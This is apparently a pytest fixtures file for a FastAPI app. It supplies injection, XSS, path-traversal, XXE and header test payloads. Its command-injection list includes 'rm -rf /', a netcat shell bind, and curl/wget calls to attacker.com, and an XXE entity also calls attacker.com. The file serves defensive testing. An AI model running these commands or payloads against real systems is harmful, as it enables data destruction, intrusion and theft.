"""
Security test fixtures and utilities
"""

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from app.main import app
from app.database import get_db
from app.models.main_tables import Project, Resource, Feature, Backlog, Risk, Approval, Charter
from app.models.lookup_tables import ProjectType, Status, Priority, ProjectCriticalityLevel, Portfolio


@pytest.fixture
def malicious_inputs():
    """Fixture providing various malicious input payloads for security testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE projects; --",
            "' OR '1'='1",
            "'; INSERT INTO projects (name) VALUES ('hacked'); --",
            "' UNION SELECT * FROM users --",
            "'; UPDATE projects SET name='hacked' WHERE 1=1; --",
            "' OR 1=1 LIMIT 1 OFFSET 0 --",
            "'; DELETE FROM projects WHERE 1=1; --",
            "' OR EXISTS(SELECT * FROM information_schema.tables) --",
        ],
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<applet code=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<style>li{list-style:url('javascript:alert(\"XSS\")');}</style>",
            "<div style=background:url('javascript:alert(\"XSS\")')>",
            "<div style=width:expression(alert('XSS'))>",
            "<div style=width:expression(alert('XSS'))>",
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<style>li{list-style:url('javascript:alert(\"XSS\")');}</style>",
            "<div style=background:url('javascript:alert(\"XSS\")')>",
            "<div style=width:expression(alert('XSS'))>",
            "<div style=width:expression(alert('XSS'))>",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
            "..%c1%af..%c1%af..%c1%afetc%c1%afpasswd",
            "..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
            "..%c1%af..%c1%af..%c1%afetc%c1%afpasswd",
            "..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l -p 4444 -e /bin/sh",
            "& curl http://attacker.com/steal",
            "; wget http://attacker.com/malware",
            "| python -c 'import os; os.system(\"id\")'",
        ],
        "ldap_injection": [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)(|(objectClass=*))",
            "*)(|(cn=*))",
            "*)(|(mail=*))",
            "*)(|(telephoneNumber=*))",
            "*)(|(description=*))",
            "*)(|(userPassword=*))",
        ],
        "no_sql_injection": [
            {"$where": "this.password == this.username"},
            {"$where": "this.password.match(/.*/)"},
            {"$where": "this.password.length > 0"},
            {"$where": "this.password.indexOf('a') > -1"},
            {"$where": "this.password.charAt(0) == 'a'"},
            {"$where": "this.password.substring(0,1) == 'a'"},
            {"$where": "this.password.substr(0,1) == 'a'"},
            {"$where": "this.password.slice(0,1) == 'a'"},
        ],
        "xml_injection": [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/steal'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>",
        ],
        "json_injection": [
            '{"name": "test", "__proto__": {"isAdmin": true}}',
            '{"name": "test", "constructor": {"prototype": {"isAdmin": true}}}',
            '{"name": "test", "valueOf": "function(){return {isAdmin: true}}"}',
            '{"name": "test", "toString": "function(){return {isAdmin: true}}"}',
        ],
        "regex_injection": [
            ".*",
            "^.*$",
            ".*|.*",
            ".*+",
            ".*?",
            ".*{1,}",
            ".*{1,1000000}",
            ".*{1000000,}",
            ".*{1000000,1000000}",
            ".*{0,1000000}",
            ".*{0,}",
            ".*{1,}",
            ".*{0,1000000}",
            ".*{1000000,}",
            ".*{1000000,1000000}",
        ],
        "unicode_attacks": [
            "test\u0000",
            "test\u0001",
            "test\u0002",
            "test\u0003",
            "test\u0004",
            "test\u0005",
            "test\u0006",
            "test\u0007",
            "test\u0008",
            "test\u0009",
            "test\u000a",
            "test\u000b",
            "test\u000c",
            "test\u000d",
            "test\u000e",
            "test\u000f",
            "test\u0010",
            "test\u0011",
            "test\u0012",
            "test\u0013",
            "test\u0014",
            "test\u0015",
            "test\u0016",
            "test\u0017",
            "test\u0018",
            "test\u0019",
            "test\u001a",
            "test\u001b",
            "test\u001c",
            "test\u001d",
            "test\u001e",
            "test\u001f",
            "test\u007f",
            "test\u0080",
            "test\u0081",
            "test\u0082",
            "test\u0083",
            "test\u0084",
            "test\u0085",
            "test\u0086",
            "test\u0087",
            "test\u0088",
            "test\u0089",
            "test\u008a",
            "test\u008b",
            "test\u008c",
            "test\u008d",
            "test\u008e",
            "test\u008f",
            "test\u0090",
            "test\u0091",
            "test\u0092",
            "test\u0093",
            "test\u0094",
            "test\u0095",
            "test\u0096",
            "test\u0097",
            "test\u0098",
            "test\u0099",
            "test\u009a",
            "test\u009b",
            "test\u009c",
            "test\u009d",
            "test\u009e",
            "test\u009f",
        ],
        "encoding_attacks": [
            "test%00",
            "test%01",
            "test%02",
            "test%03",
            "test%04",
            "test%05",
            "test%06",
            "test%07",
            "test%08",
            "test%09",
            "test%0a",
            "test%0b",
            "test%0c",
            "test%0d",
            "test%0e",
            "test%0f",
            "test%10",
            "test%11",
            "test%12",
            "test%13",
            "test%14",
            "test%15",
            "test%16",
            "test%17",
            "test%18",
            "test%19",
            "test%1a",
            "test%1b",
            "test%1c",
            "test%1d",
            "test%1e",
            "test%1f",
            "test%7f",
            "test%80",
            "test%81",
            "test%82",
            "test%83",
            "test%84",
            "test%85",
            "test%86",
            "test%87",
            "test%88",
            "test%89",
            "test%8a",
            "test%8b",
            "test%8c",
            "test%8d",
            "test%8e",
            "test%8f",
            "test%90",
            "test%91",
            "test%92",
            "test%93",
            "test%94",
            "test%95",
            "test%96",
            "test%97",
            "test%98",
            "test%99",
            "test%9a",
            "test%9b",
            "test%9c",
            "test%9d",
            "test%9e",
            "test%9f",
        ],
    }


@pytest.fixture
def security_test_data(db_session):
    """Create test data for security testing."""
    # Create lookup data
    project_type = ProjectType(
        id=1,
        type_name="Security Test",
        description="Project type for security testing"
    )
    status = Status(
        id=1,
        status_name="Active",
        description="Active status for security testing"
    )
    priority = Priority(
        id=1,
        priority_name="High",
        level=1,
        description="High priority for security testing"
    )
    criticality = ProjectCriticalityLevel(
        id=1,
        level_name="Critical",
        level_value=1,
        description="Critical level for security testing"
    )
    portfolio = Portfolio(
        id=1,
        portfolio_name="Security Portfolio",
        description="Portfolio for security testing"
    )
    
    db_session.add_all([project_type, status, priority, criticality, portfolio])
    db_session.commit()
    
    # Create test project
    project = Project(
        project_id="SEC-TEST-001",
        name="Security Test Project",
        description="Project for security testing",
        project_type_id=1,
        status_id=1,
        priority_id=1,
        criticality_id=1,
        portfolio_id=1,
        budget_amount=100000.0,
        is_active=True
    )
    
    # Create test resource
    resource = Resource(
        resource_id="RES-SEC-001",
        name="Security Test Resource",
        email="security.test@example.com",
        role="Security Tester",
        department="Security",
        is_active=True
    )
    
    db_session.add_all([project, resource])
    db_session.commit()
    
    return {
        "project": project,
        "resource": resource,
        "project_type": project_type,
        "status": status,
        "priority": priority,
        "criticality": criticality,
        "portfolio": portfolio
    }


@pytest.fixture
def security_client():
    """Create a test client for security testing."""
    return TestClient(app)


@pytest.fixture
def authenticated_client(security_client):
    """Create an authenticated test client for security testing."""
    # Mock authentication for security testing
    return security_client


@pytest.fixture
def unauthenticated_client(security_client):
    """Create an unauthenticated test client for security testing."""
    return security_client


@pytest.fixture
def malicious_headers():
    """Fixture providing malicious HTTP headers for testing."""
    return {
        "x_forwarded_for": [
            "127.0.0.1",
            "127.0.0.1, 192.168.1.1",
            "127.0.0.1, 192.168.1.1, 10.0.0.1",
            "127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1",
            "127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1, 203.0.113.1",
            "127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1, 203.0.113.1, 198.51.100.1",
            "127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1, 203.0.113.1, 198.51.100.1, 192.0.2.1",
            "127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1, 203.0.113.1, 198.51.100.1, 192.0.2.1, 198.18.0.1",
        ],
        "user_agent": [
            "Mozilla/5.0 (compatible; SecurityBot/1.0)",
            "Mozilla/5.0 (compatible; SecurityBot/1.0; +http://security.example.com/bot)",
            "Mozilla/5.0 (compatible; SecurityBot/1.0; +http://security.example.com/bot; +http://security.example.com/contact)",
            "Mozilla/5.0 (compatible; SecurityBot/1.0; +http://security.example.com/bot; +http://security.example.com/contact; +http://security.example.com/privacy)",
            "Mozilla/5.0 (compatible; SecurityBot/1.0; +http://security.example.com/bot; +http://security.example.com/contact; +http://security.example.com/privacy; +http://security.example.com/terms)",
        ],
        "referer": [
            "https://security.example.com/",
            "https://security.example.com/test",
            "https://security.example.com/test?param=value",
            "https://security.example.com/test?param=value&other=test",
            "https://security.example.com/test?param=value&other=test&more=data",
        ],
        "origin": [
            "https://security.example.com",
            "https://security.example.com:8080",
            "https://security.example.com:8443",
            "https://security.example.com:9443",
            "https://security.example.com:10443",
        ],
        "host": [
            "security.example.com",
            "security.example.com:8080",
            "security.example.com:8443",
            "security.example.com:9443",
            "security.example.com:10443",
        ],
        "content_type": [
            "application/json",
            "application/json; charset=utf-8",
            "application/json; charset=utf-8; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            "application/x-www-form-urlencoded",
            "text/plain",
            "text/html",
            "text/xml",
            "application/xml",
            "application/soap+xml",
        ],
        "accept": [
            "application/json",
            "application/json, text/plain, */*",
            "application/json, text/plain, */*; q=0.01",
            "application/json, text/plain, */*; q=0.01, application/xml; q=0.9",
            "application/json, text/plain, */*; q=0.01, application/xml; q=0.9, text/xml; q=0.8",
        ],
        "accept_encoding": [
            "gzip, deflate",
            "gzip, deflate, br",
            "gzip, deflate, br, identity",
            "gzip, deflate, br, identity, *",
            "gzip, deflate, br, identity, *; q=0",
        ],
        "accept_language": [
            "en-US,en;q=0.9",
            "en-US,en;q=0.9, es;q=0.8",
            "en-US,en;q=0.9, es;q=0.8, fr;q=0.7",
            "en-US,en;q=0.9, es;q=0.8, fr;q=0.7, de;q=0.6",
            "en-US,en;q=0.9, es;q=0.8, fr;q=0.7, de;q=0.6, it;q=0.5",
        ],
        "cache_control": [
            "no-cache",
            "no-cache, no-store, must-revalidate",
            "no-cache, no-store, must-revalidate, max-age=0",
            "no-cache, no-store, must-revalidate, max-age=0, post-check=0, pre-check=0",
            "no-cache, no-store, must-revalidate, max-age=0, post-check=0, pre-check=0, private",
        ],
        "pragma": [
            "no-cache",
            "no-cache, no-store",
            "no-cache, no-store, must-revalidate",
            "no-cache, no-store, must-revalidate, max-age=0",
            "no-cache, no-store, must-revalidate, max-age=0, post-check=0, pre-check=0",
        ],
        "authorization": [
            "Bearer valid_token",
            "Bearer invalid_token",
            "Bearer expired_token",
            "Bearer malformed_token",
            "Bearer ",
            "Basic dGVzdDp0ZXN0",
            "Basic dGVzdDp0ZXN0Og==",
            "Basic dGVzdDp0ZXN0Ojo=",
            "Basic dGVzdDp0ZXN0Ojo6",
            "Basic dGVzdDp0ZXN0Ojo6Og==",
        ],
    }


@pytest.fixture
def security_test_scenarios():
    """Fixture providing security test scenarios."""
    return {
        "authentication_bypass": [
            {
                "name": "No Authentication",
                "headers": {},
                "expected_status": [200, 401, 403]
            },
            {
                "name": "Invalid Token",
                "headers": {"Authorization": "Bearer invalid_token"},
                "expected_status": [200, 401, 403]
            },
            {
                "name": "Malformed Token",
                "headers": {"Authorization": "Bearer malformed_token"},
                "expected_status": [200, 401, 403]
            },
            {
                "name": "Empty Token",
                "headers": {"Authorization": "Bearer "},
                "expected_status": [200, 401, 403]
            },
            {
                "name": "Wrong Auth Type",
                "headers": {"Authorization": "Basic dGVzdDp0ZXN0"},
                "expected_status": [200, 401, 403]
            },
        ],
        "authorization_escalation": [
            {
                "name": "Access Other User Data",
                "endpoint": "/api/v1/projects/99999",
                "expected_status": [200, 403, 404]
            },
            {
                "name": "Access Admin Endpoints",
                "endpoint": "/api/v1/admin/users",
                "expected_status": [200, 403, 404]
            },
            {
                "name": "Access System Endpoints",
                "endpoint": "/api/v1/system/config",
                "expected_status": [200, 403, 404]
            },
        ],
        "input_validation": [
            {
                "name": "SQL Injection",
                "payload": "'; DROP TABLE projects; --",
                "field": "name",
                "expected_behavior": "reject_or_sanitize"
            },
            {
                "name": "XSS Attack",
                "payload": "<script>alert('XSS')</script>",
                "field": "description",
                "expected_behavior": "sanitize"
            },
            {
                "name": "Path Traversal",
                "payload": "../../../etc/passwd",
                "field": "filename",
                "expected_behavior": "reject_or_sanitize"
            },
            {
                "name": "Command Injection",
                "payload": "; ls -la",
                "field": "command",
                "expected_behavior": "reject"
            },
        ],
        "data_exposure": [
            {
                "name": "Sensitive Data in Response",
                "endpoint": "/api/v1/projects/1",
                "sensitive_fields": ["password", "secret", "key", "token"],
                "expected_behavior": "not_expose"
            },
            {
                "name": "Error Information Disclosure",
                "endpoint": "/api/v1/invalid",
                "sensitive_info": ["traceback", "file", "line", "database"],
                "expected_behavior": "not_expose"
            },
        ],
    }


@pytest.fixture
def security_headers():
    """Fixture providing security headers for testing."""
    return {
        "content_security_policy": [
            "default-src 'self'",
            "default-src 'self'; script-src 'self' 'unsafe-inline'",
            "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'",
            "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'",
            "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:",
        ],
        "x_frame_options": [
            "DENY",
            "SAMEORIGIN",
            "ALLOW-FROM https://example.com",
        ],
        "x_content_type_options": [
            "nosniff",
        ],
        "x_xss_protection": [
            "1; mode=block",
            "1; mode=block; report=/xss-report",
        ],
        "strict_transport_security": [
            "max-age=31536000",
            "max-age=31536000; includeSubDomains",
            "max-age=31536000; includeSubDomains; preload",
        ],
        "referrer_policy": [
            "no-referrer",
            "no-referrer-when-downgrade",
            "origin",
            "origin-when-cross-origin",
            "same-origin",
            "strict-origin",
            "strict-origin-when-cross-origin",
            "unsafe-url",
        ],
        "permissions_policy": [
            "geolocation=()",
            "geolocation=(), microphone=()",
            "geolocation=(), microphone=(), camera=()",
            "geolocation=(), microphone=(), camera=(), payment=()",
            "geolocation=(), microphone=(), camera=(), payment=(), usb=()",
        ],
    }


@pytest.fixture
def security_test_vectors():
    """Fixture providing security test vectors."""
    return {
        "owasp_top_10": [
            "A01:2021 - Broken Access Control",
            "A02:2021 - Cryptographic Failures",
            "A03:2021 - Injection",
            "A04:2021 - Insecure Design",
            "A05:2021 - Security Misconfiguration",
            "A06:2021 - Vulnerable and Outdated Components",
            "A07:2021 - Identification and Authentication Failures",
            "A08:2021 - Software and Data Integrity Failures",
            "A09:2021 - Security Logging and Monitoring Failures",
            "A10:2021 - Server-Side Request Forgery (SSRF)",
        ],
        "cwe_categories": [
            "CWE-79: Cross-site Scripting (XSS)",
            "CWE-89: SQL Injection",
            "CWE-20: Improper Input Validation",
            "CWE-352: Cross-Site Request Forgery (CSRF)",
            "CWE-434: Unrestricted Upload of File with Dangerous Type",
            "CWE-798: Use of Hard-coded Credentials",
            "CWE-311: Missing Encryption of Sensitive Data",
            "CWE-862: Missing Authorization",
            "CWE-863: Incorrect Authorization",
            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        ],
        "security_headers": [
            "Content-Security-Policy",
            "X-Frame-Options",
            "X-Content-Type-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Referrer-Policy",
            "Permissions-Policy",
            "Cross-Origin-Embedder-Policy",
            "Cross-Origin-Opener-Policy",
            "Cross-Origin-Resource-Policy",
        ],
    }
